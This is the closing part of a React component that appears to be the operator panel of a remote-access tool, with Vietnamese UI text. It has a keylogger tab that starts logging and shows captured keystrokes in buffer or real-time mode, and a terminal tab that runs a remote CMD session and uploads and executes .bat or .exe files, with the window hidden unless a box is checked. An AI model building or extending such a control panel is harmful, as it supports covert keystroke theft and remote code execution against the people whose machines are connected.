                      💾 Buffer Mode
                    </button>
                    <button 
                      onClick={() => handleKeylogModeChange('realtime')}
                      className={`btn btn-mode ${keylogMode === 'realtime' ? 'active' : ''}`}
                    >
                      ⚡ Real-time Mode
                    </button>
                  </div>
                  <p className="mode-description">
                    {keylogMode === 'buffer' 
                      ? '💾 Buffer: Dữ liệu được lưu và lấy theo yêu cầu' 
                      : '⚡ Real-time: Mỗi phím nhấn được gửi ngay lập tức'}
                  </p>
                </div>
                
                {/* Command Buttons */}
                <div className="command-buttons">
                  <button onClick={() => sendCommand('START_KEYLOG')} className="btn btn-command">
                    🔄 Reset & Start Logging
                  </button>
                  {keylogMode === 'buffer' && (
                    <button onClick={() => sendCommand('GET_KEYLOG')} className="btn btn-command">
                      👁️ View Buffer
                    </button>
                  )}
                  <button onClick={clearKeylogDisplay} className="btn btn-small">
                    🧹 Clear Display
                  </button>
                </div>
                
                {/* Keylog Display - Dual Panel */}
                <div className="keylog-display-dual">
                  {/* Raw Output Panel */}
                  <div className="keylog-panel">
                    <h4>📝 Raw Output</h4>
                    <div className="keylog-content">
                      <pre>{keylogMode === 'realtime' ? realtimeKeylog : bufferKeylog}</pre>
                    </div>
                  </div>
                  
                  {/* Readable Output Panel */}
                  <div className="keylog-panel">
                    <h4>📖 Readable Output</h4>
                    <div className="keylog-content">
                      <pre>{parseKeylogToReadable(keylogMode === 'realtime' ? realtimeKeylog : bufferKeylog)}</pre>
                    </div>
                  </div>
                </div>
              </div>
            )}

            {activeTab === 'terminal' && (
              <div className="command-section">
                <div style={{display: 'flex', alignItems: 'center', gap: '16px', marginBottom: '20px'}}>
                  <h3 style={{margin: 0}}>💻 CMD Terminal</h3>
                  <label className="checkbox-label" title="Show windows when running CMD session or executing uploaded files" style={{margin: 0}}>
                    <input
                      type="checkbox"
                      checked={cmdShowWindow}
                      onChange={(e) => setCmdShowWindow(e.target.checked)}
                      disabled={cmdRunning}
                    />
                    <span>Show Terminal Window</span>
                  </label>
                </div>

                {/* File Upload Section */}
                <div className="file-upload-section">
                  <h4>📁 Run .bat or .exe File</h4>
                  <div className="upload-controls">
                    <input
                      type="file"
                      accept=".bat,.exe,.cmd"
                      onChange={handleFileUpload}
                      id="file-upload"
                      className="file-input"
                    />
                    <label htmlFor="file-upload" className="btn btn-upload">
                      📤 Choose File
                    </label>
                    {uploadedFile && (
                      <span className="file-name">✅ {uploadedFile.name}</span>
                    )}
                    <button 
                      onClick={handleRunUploadedFile} 
                      className="btn btn-execute"
                      disabled={!uploadedFile || !isConnected}
                    >
                      🚀 Execute File
                    </button>
                  </div>
                </div>

                {/* Terminal Controls */}
                <div className="terminal-controls">
                  <div className="control-row">
                    <div className="status-badge">
                      Status: <span className={cmdRunning ? 'status-running' : 'status-stopped'}>
                        {cmdRunning ? '🟢 Running' : '🔴 Stopped'}
                      </span>
                    </div>
                  </div>
                  
                  <div className="button-row">
                    <button 
                      onClick={handleStartCmdSession} 
                      className="btn btn-success"
                      disabled={cmdRunning || !isConnected}
                    >
                      ▶️ Start Session
                    </button>
                    <button 
                      onClick={handleStopCmdSession} 
                      className="btn btn-warning"
                      disabled={!cmdRunning}
                    >
                      ⏹️ Stop Session
                    </button>
                    <button 
                      onClick={handleKillCmdProcess} 
                      className="btn btn-danger"
                      disabled={!cmdRunning}
                    >
                      ⛔ Force Kill
                    </button>
                    <button 
                      onClick={handleClearCmdOutput} 
                      className="btn btn-small"
                    >
                      🧹 Clear Output
                    </button>
                  </div>

                  {/* Command Input */}
                  {cmdRunning && (
                    <div className="terminal-input-section" style={{marginTop: '16px'}}>
                      <h4>⌨️ Execute Command</h4>
                      <div className="input-group">
                        <input
                          type="text"
                          value={cmdInput}
                          onChange={(e) => setCmdInput(e.target.value)}
                          onKeyPress={(e) => e.key === 'Enter' && handleSendCommand()}
                          placeholder="Enter command (e.g., dir, ipconfig, ping google.com)"
                          className="terminal-input"
                        />
                        <button 
                          onClick={handleSendCommand} 
                          className="btn btn-send"
                          disabled={!cmdInput.trim()}
                        >
                          📤 Send
                        </button>
                      </div>
                    </div>
                  )}
                </div>

                {/* Terminal Output */}
                <div className="terminal-output">
                  <h4>📟 Terminal Output</h4>
                  <div className="terminal-content">
                    <pre>{cmdOutput || 'No output yet. Start a session or run a command...'}</pre>
                  </div>
                </div>
              </div>
            )}
          </div>
        </div>

        {/* Resize Handle */}
        <div className="resize-handle"></div>

        {/* Logs Panel */}
        <div className="logs-panel" style={{ width: `${logsPanelWidth}px` }}>
          <div className="logs-header">
            <h3>📝 System Logs</h3>
            <button onClick={clearLogs} className="btn btn-small">Clear</button>
          </div>
          <div className="logs-content">
            {logs.length === 0 ? (
              <p className="no-logs">No logs yet...</p>
            ) : (
              logs.map((log, index) => (
                <div key={index} className={`log-entry log-${log.type}`}>
                  <span className="log-time">[{log.timestamp}]</span>
                  <span className="log-message">{log.message}</span>
                </div>
              ))
            )}
          </div>
        </div>
      </div>
      
      </>
      )}
      
      {/* Custom Modal - Always render outside login check */}
      {modal.show && (
        <div className="modal-overlay" onClick={closeModal}>
          <div className="modal-box" onClick={(e) => e.stopPropagation()}>
            <div className="modal-header">
              <h3>{modal.title}</h3>
              <button className="modal-close" onClick={closeModal}>✕</button>
            </div>
            <div className="modal-body">
              <p>{modal.message}</p>
            </div>
            <div className="modal-footer">
              {modal.type === 'confirm' ? (
                <>
                  <button className="btn-modal btn-cancel" onClick={closeModal}>
                    Cancel
                  </button>
                  <button className="btn-modal btn-confirm" onClick={handleModalConfirm}>
                    OK
                  </button>
                </>
              ) : (
                <button className="btn-modal btn-ok" onClick={closeModal}>
                  OK
                </button>
              )}
            </div>
          </div>
        </div>
      )}
    </div>
  );
};

export default App;
